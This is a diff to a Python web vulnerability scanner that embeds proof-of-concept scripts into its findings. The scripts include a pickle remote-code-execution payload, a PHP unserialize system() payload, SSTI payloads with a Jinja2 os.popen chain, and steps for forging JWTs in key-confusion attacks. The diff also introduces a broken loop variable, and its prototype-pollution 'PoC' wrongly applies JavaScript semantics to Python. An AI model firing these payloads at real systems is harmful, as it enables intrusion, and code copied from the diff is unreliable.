@@ -21,6 +21,8 @@ import jwt
 from cryptography import x509
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.asymmetric import padding
+import datetime
+import hashlib
 
 # Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -325,10 +327,30 @@ def check_cors_misconfig(content, current_url):
     secrets = []
     cors_regex = r'Access-Control-Allow-Origin\s*:\s*\*'
     cors_matches = re.finditer(cors_regex, content, re.IGNORECASE)
-    for match in cors_matches:
+    for match in matches:
         context = get_context(content, match.start(), match.end())
         poc = f'''
-curl -H "Origin: https://attacker.com" -I {current_url}
+# CORS Misconfiguration POC
+# Run this Python script to verify the CORS misconfiguration
+
+import requests
+
+url = "{current_url}"
+headers = {{"Origin": "https://attacker.com"}}
+
+response = requests.options(url, headers=headers)
+print(f"Response headers: {{response.headers}}")
+
+if "Access-Control-Allow-Origin" in response.headers:
+    if response.headers["Access-Control-Allow-Origin"] == "*" or response.headers["Access-Control-Allow-Origin"] == "https://attacker.com":
+        print("CORS Misconfiguration Confirmed!")
+    else:
+        print("CORS seems to be properly configured.")
+else:
+    print("No CORS headers found.")
+
+# Curl command for manual verification:
+# curl -H "Origin: https://attacker.com" -I {current_url}
 '''
         secrets.append({
             'kind': 'CORSMisconfiguration',
@@ -337,7 +359,7 @@ curl -H "Origin: https://attacker.com" -I {current_url}
             'severity': 'medium',
             'context': context,
             'poc': poc,
-            'description': f"Overly permissive CORS policy detected in {current_url}. This may allow unintended cross-origin requests."
+            'description': f"Overly permissive CORS policy detected in {current_url}. This may allow unintended cross-origin requests. Please verify using the provided POC script."
         })
     return secrets
 
@@ -347,30 +369,80 @@ def verify_cors_misconfig(url):
         response = requests.options(url, headers=headers, timeout=5)
         if 'Access-Control-Allow-Origin' in response.headers:
             if response.headers['Access-Control-Allow-Origin'] == '*' or response.headers['Access-Control-Allow-Origin'] == 'https://attacker.com':
-                return True
-    except:
-        pass
-    return False
+                return True, response.headers
+    except Exception as e:
+        return False, str(e)
+    return False, None
 
 def check_subdomain_takeover(url):
     try:
         parsed_url = urlparse(url)
         ip = socket.gethostbyname(parsed_url.netloc)
         if ip in ['127.0.0.1', '0.0.0.0']:
+            poc = f'''
+# Subdomain Takeover POC
+# Run this Python script to verify the potential subdomain takeover
+
+import socket
+from urllib.parse import urlparse
+
+url = "{url}"
+parsed_url = urlparse(url)
+
+try:
+    ip = socket.gethostbyname(parsed_url.netloc)
+    print(f"Resolved IP: {{ip}}")
+    if ip in ['127.0.0.1', '0.0.0.0']:
+        print("Potential Subdomain Takeover Detected!")
+        print(f"The domain {{parsed_url.netloc}} resolves to {{ip}}, which may indicate a subdomain takeover vulnerability.")
+    else:
+        print("The domain resolves to a different IP. Further investigation may be needed.")
+except socket.gaierror:
+    print(f"Unable to resolve {{parsed_url.netloc}}. This could also indicate a potential subdomain takeover.")
+
+# Additional manual checks:
+# 1. Check if the domain is pointing to a non-existent resource on a cloud service (e.g., GitHub Pages, Heroku, etc.)
+# 2. Look for error messages that indicate the resource doesn't exist
+# 3. Try to claim the subdomain on the respective platform if possible
+'''
             return {
                 'kind': 'PotentialSubdomainTakeover',
                 'data': {'value': url, 'ip': ip},
                 'filename': url,
                 'severity': 'high',
-                'description': f"Potential subdomain takeover vulnerability detected for {url}. IP resolves to {ip}."
+                'poc': poc,
+                'description': f"Potential subdomain takeover vulnerability detected for {url}. IP resolves to {ip}. Please verify using the provided POC script."
             }
     except socket.gaierror:
+        poc = f'''
+# Subdomain Takeover POC
+# Run this Python script to verify the potential subdomain takeover
+
+import socket
+from urllib.parse import urlparse
+
+url = "{url}"
+parsed_url = urlparse(url)
+
+try:
+    ip = socket.gethostbyname(parsed_url.netloc)
+    print(f"Resolved IP: {{ip}}")
+    print("The domain resolves. This might not be a subdomain takeover.")
+except socket.gaierror:
+    print(f"Unable to resolve {{parsed_url.netloc}}. This could indicate a potential subdomain takeover.")
+
+# Additional manual checks:
+# 1. Check if the domain is pointing to a non-existent resource on a cloud service (e.g., GitHub Pages, Heroku, etc.)
+# 2. Look for error messages that indicate the resource doesn't exist
+# 3. Try to claim the subdomain on the respective platform if possible
+'''
         return {
             'kind': 'PotentialSubdomainTakeover',
             'data': {'value': url},
             'filename': url,
             'severity': 'high',
-            'description': f"Potential subdomain takeover vulnerability detected for {url}. Domain does not resolve."
+            'poc': poc,
+            'description': f"Potential subdomain takeover vulnerability detected for {url}. Domain does not resolve. Please verify using the provided POC script."
         }
     return None
 
@@ -386,24 +458,77 @@ def check_ssl_misconfigurations(url):
                 # Check for weak cipher suites
                 ciphers = secure_sock.cipher()
                 if ciphers[0] in ['TLS_RSA_WITH_RC4_128_SHA', 'TLS_RSA_WITH_RC4_128_MD5']:
+                    poc = f'''
+# Weak SSL Cipher POC
+# Run this Python script to verify the weak SSL cipher
+
+import ssl
+import socket
+from urllib.parse import urlparse
+
+url = "{url}"
+parsed_url = urlparse(url)
+hostname = parsed_url.netloc
+
+context = ssl.create_default_context()
+with socket.create_connection((hostname, 443)) as sock:
+    with context.wrap_socket(sock, server_hostname=hostname) as secure_sock:
+        cipher = secure_sock.cipher()
+        print(f"Cipher suite in use: {{cipher[0]}}")
+        if cipher[0] in ['TLS_RSA_WITH_RC4_128_SHA', 'TLS_RSA_WITH_RC4_128_MD5']:
+            print("Weak cipher detected!")
+        else:
+            print("Cipher seems to be secure.")
+
+# You can also use OpenSSL to check supported ciphers:
+# openssl s_client -connect {hostname}:443 -cipher 'RC4'
+'''
                     return {
                         'kind': 'WeakSSLCipher',
                         'data': {'value': ciphers[0]},
                         'filename': url,
                         'severity': 'high',
-                        'description': f"Weak SSL cipher suite detected: {ciphers[0]}"
+                        'poc': poc,
+                        'description': f"Weak SSL cipher suite detected: {ciphers[0]}. Please verify using the provided POC script."
                     }
                 
                 # Check for expired certificates
-                import datetime
                 exp_date = datetime.datetime.strptime(cert['notAfter'], "%b %d %H:%M:%S %Y %Z")
                 if exp_date < datetime.datetime.now():
+                    poc = f'''
+# Expired SSL Certificate POC
+# Run this Python script to verify the expired SSL certificate
+
+import ssl
+import socket
+from urllib.parse import urlparse
+import datetime
+
+url = "{url}"
+parsed_url = urlparse(url)
+hostname = parsed_url.netloc
+
+context = ssl.create_default_context()
+with socket.create_connection((hostname, 443)) as sock:
+    with context.wrap_socket(sock, server_hostname=hostname) as secure_sock:
+        cert = secure_sock.getpeercert()
+        exp_date = datetime.datetime.strptime(cert['notAfter'], "%b %d %H:%M:%S %Y %Z")
+        print(f"Certificate expiration date: {{exp_date}}")
+        if exp_date < datetime.datetime.now():
+            print("Certificate has expired!")
+        else:
+            print("Certificate is still valid.")
+
+# You can also use OpenSSL to check the certificate:
+# openssl s_client -connect {hostname}:443 -servername {hostname} | openssl x509 -noout -dates
+'''
                     return {
                         'kind': 'ExpiredSSLCertificate',
                         'data': {'value': cert['notAfter']},
                         'filename': url,
                         'severity': 'high',
-                        'description': f"SSL certificate expired on {cert['notAfter']}"
+                        'poc': poc,
+                        'description': f"SSL certificate expired on {cert['notAfter']}. Please verify using the provided POC script."
                     }
                 
     except Exception as e:
@@ -412,7 +537,7 @@ def check_ssl_misconfigurations(url):
             'data': {'value': str(e)},
             'filename': url,
             'severity': 'medium',
-            'description': f"Error occurred while checking SSL: {str(e)}"
+            'description': f"Error occurred while checking SSL: {str(e)}. Manual verification is recommended."
         }
     return None
 
@@ -428,12 +553,48 @@ def check_jwt_key_confusion(content, current_url):
                 public_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozMxH2Mo\n4lgOEePzNm0tRgeLezV6ffAt0gunVTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u\n+qKhbwKfBstIs+bMY2Zkp18gnTxKLxoS2tFczGkPLPgizskuemMghRniWaoLcyeh\nkd3qqGElvW/VDL5AaWTg0nLVkjRo9z+40RQzuVaE8AkAFmxZzow3x+VJYKdjykkJ\n0iT9wCS0DRTXu269V264Vf/3jvredZiKRkgwlL9xNAwxXFg0x/XFw005UWVRIkdg\ncKWTjpBP2dPwVZ4WWC+9aGVd+Gyn1o0CLelf4rEjGoXbAAEgAqeGUxrcIlbjXfbc\nmwIDAQAB\n-----END PUBLIC KEY-----"
                 try:
                     jwt.decode(token, public_key, algorithms=['HS256'])
+                    poc = f'''
+# JWT Key Confusion Vulnerability POC
+# Run this Python script to verify the JWT key confusion vulnerability
+
+import jwt
+
+token = "{token}"
+public_key = """-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu1SU1LfVLPHCozMxH2Mo
+4lgOEePzNm0tRgeLezV6ffAt0gunVTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u
++qKhbwKfBstIs+bMY2Zkp18gnTxKLxoS2tFczGkPLPgizskuemMghRniWaoLcyeh
+kd3qqGElvW/VDL5AaWTg0nLVkjRo9z+40RQzuVaE8AkAFmxZzow3x+VJYKdjykkJ
+0iT9wCS0DRTXu269V264Vf/3jvredZiKRkgwlL9xNAwxXFg0x/XFw005UWVRIkdg
+cKWTjpBP2dPwVZ4WWC+9aGVd+Gyn1o0CLelf4rEjGoXbAAEgAqeGUxrcIlbjXfbc
+mwIDAQAB
+-----END PUBLIC KEY-----"""
+
+try:
+    decoded = jwt.decode(token, public_key, algorithms=['HS256'])
+    print("JWT Key Confusion Vulnerability Confirmed!")
+    print(f"Decoded token: {{decoded}}")
+except jwt.exceptions.InvalidSignatureError:
+    print("Token signature is invalid. No vulnerability detected.")
+except Exception as e:
+    print(f"An error occurred: {{e}}")
+
+# To exploit this vulnerability:
+# 1. Create a new token with the same header and payload
+# 2. Sign it using the public key as the secret
+# 3. Use this token to gain unauthorized access
+
+# Example:
+# new_token = jwt.encode(decoded, public_key, algorithm='HS256')
+# print(f"New forged token: {{new_token}}")
+'''
                     return {
                         'kind': 'JWTKeyConfusionVulnerability',
                         'data': {'value': token[:20] + '...'},
                         'filename': current_url,
                         'severity': 'critical',
-                        'description': "Potential JWT key confusion vulnerability. The token uses HS256 algorithm and can be verified with a common public key."
+                        'poc': poc,
+                        'description': "Potential JWT key confusion vulnerability. The token uses HS256 algorithm and can be verified with a common public key. Please verify using the provided POC script."
                     }
                 except:
                     pass
@@ -453,12 +614,52 @@ def check_prototype_pollution(content, current_url):
         matches = re.finditer(pattern, content)
         for match in matches:
             context = get_context(content, match.start(), match.end())
+            poc = f'''
+# Prototype Pollution Vulnerability POC
+# This is a conceptual POC. Actual exploitation depends on the specific implementation.
+
+# Assume we have a vulnerable function like this:
+def merge(target, source):
+    for key in source:
+        if isinstance(source[key], dict):
+            target[key] = merge(target.get(key, {}), source[key])
+        else:
+            target[key] = source[key]
+    return target
+
+# Exploitation:
+malicious_payload = {{"__proto__": {{"polluted": "Yes, I am polluted!"}}}}
+
+# Merge the malicious payload
+merge({{}}, malicious_payload)
+
+# Now, any object should have the 'polluted' property
+obj = {{}}
+print(obj.polluted)  # Should print: "Yes, I am polluted!"
+
+# To test this on the target application:
+# 1. Identify input fields or API endpoints that accept JSON data
+# 2. Try to inject the malicious payload
+# 3. Check if global Object prototype has been polluted
+
+# Example for API testing:
+import requests
+
+url = "{current_url}"
+payload = {{"__proto__": {{"polluted": "Yes, I am polluted!"}}}}
+
+response = requests.post(url, json=payload)
+print(response.text)  # Check the response for signs of successful pollution
+
+# After sending the payload, try to access the 'polluted' property on different objects in the application
+'''
             return {
                 'kind': 'PotentialPrototypePollution',
                 'data': {'value': match.group(), 'context': context},
                 'filename': current_url,
                 'severity': 'high',
-                'description': f"Potential prototype pollution vulnerability detected in {current_url}. This could lead to object property manipulation and potential RCE."
+                'poc': poc,
+                'description': f"Potential prototype pollution vulnerability detected in {current_url}. This could lead to object property manipulation and potential RCE. Please verify using the provided POC script."
             }
     return None
 
@@ -474,12 +675,62 @@ def check_deserialization_vulnerabilities(content, current_url):
         matches = re.finditer(pattern, content)
         for match in matches:
             context = get_context(content, match.start(), match.end())
+            poc = f'''
+# Deserialization Vulnerability POC
+# This is a conceptual POC. Actual exploitation depends on the specific implementation and language.
+
+# For JavaScript (JSON.parse and eval):
+malicious_payload = '{{"__proto__": {{"polluted": true}}}}'
+
+# Try to find an endpoint that accepts this payload and uses JSON.parse or eval
+# Example:
+import requests
+
+url = "{current_url}"
+headers = {{"Content-Type": "application/json"}}
+response = requests.post(url, data=malicious_payload, headers=headers)
+print(response.text)
+
+# For PHP (unserialize):
+# Assuming a vulnerable PHP code like this:
+# $data = unserialize($_GET['data']);
+
+# Malicious payload (replace CLASS_NAME with an existing class name in the application):
+# O:11:"CLASS_NAME":1:{{s:10:"malicious";s:36:"system('id; uname -a; ls -la; pwd;');"}}
+
+# URL encode the payload and send it to the vulnerable endpoint:
+# {current_url}?data=O%3A11%3A%22CLASS_NAME%22%3A1%3A%7Bs%3A10%3A%22malicious%22%3Bs%3A36%3A%22system%28%27id%3B+uname+-a%3B+ls+-la%3B+pwd%3B%27%29%3B%22%7D
+
+# For Python (pickle):
+# Assuming a vulnerable Python code like this:
+# data = pickle.loads(request.GET.get('data'))
+
+import pickle
+import base64
+import os
+
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('id; uname -a; ls -la; pwd;',))
+
+# Serialize the malicious object
+serialized = pickle.dumps(RCE())
+encoded = base64.b64encode(serialized).decode()
+
+# Send this to the vulnerable endpoint:
+# {current_url}?data=<encoded_payload>
+
+print(f"Encoded payload: {{encoded}}")
+
+# Remember to always validate and sanitize user input before deserialization!
+'''
             return {
                 'kind': 'PotentialDeserializationVulnerability',
                 'data': {'value': match.group(), 'context': context},
                 'filename': current_url,
                 'severity': 'high',
-                'description': f"Potential deserialization vulnerability detected in {current_url}. This could lead to remote code execution if user input is not properly sanitized."
+                'poc': poc,
+                'description': f"Potential deserialization vulnerability detected in {current_url}. This could lead to remote code execution if user input is not properly sanitized. Please verify using the provided POC script."
             }
     return None
 
@@ -495,12 +746,49 @@ def check_server_side_template_injection(content, current_url):
         matches = re.finditer(pattern, content)
         for match in matches:
             context = get_context(content, match.start(), match.end())
+            poc = f'''
+# Server-Side Template Injection (SSTI) Vulnerability POC
+# This is a conceptual POC. Actual payloads depend on the template engine in use.
+
+import requests
+
+url = "{current_url}"
+
+# Test payloads for different template engines
+payloads = [
+    '{{7*7}}',  # Jinja2, Twig
+    '${{7*7}}',  # JSP, JSF
+    '<%= 7*7 %>',  # ERB, ASP
+    '#{{7*7}}',  # Ruby ERB
+    '${{{7*7}}}',  # JSP
+    '{{7*'+'7}}',  # Bypass some filters
+    '{{config}}',  # Jinja2 config object
+    '{{self.__init__.__globals__.__builtins__}}',  # Python builtins in Jinja2
+]
+
+for payload in payloads:
+    print(f"Testing payload: {{payload}}")
+    response = requests.get(url, params={{"input": payload}})
+    print(f"Response: {{response.text}}")
+    print("---")
+
+# If any of these payloads return '49' or expose sensitive information,
+# it likely indicates a SSTI vulnerability.
+
+# For more advanced exploitation:
+# Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+# ERB: <%= `id` %>
+# JSP: ${{Runtime.getRuntime().exec("id")}}
+
+# Remember to always validate and sanitize user input in templates!
+'''
             return {
                 'kind': 'PotentialServerSideTemplateInjection',
                 'data': {'value': match.group(), 'context': context},
                 'filename': current_url,
                 'severity': 'high',
-                'description': f"Potential server-side template injection vulnerability detected in {current_url}. This could lead to remote code execution if user input is not properly sanitized."
+                'poc': poc,
+                'description': f"Potential server-side template injection vulnerability detected in {current_url}. This could lead to remote code execution if user input is not properly sanitized. Please verify using the provided POC script."
             }
     return None
 
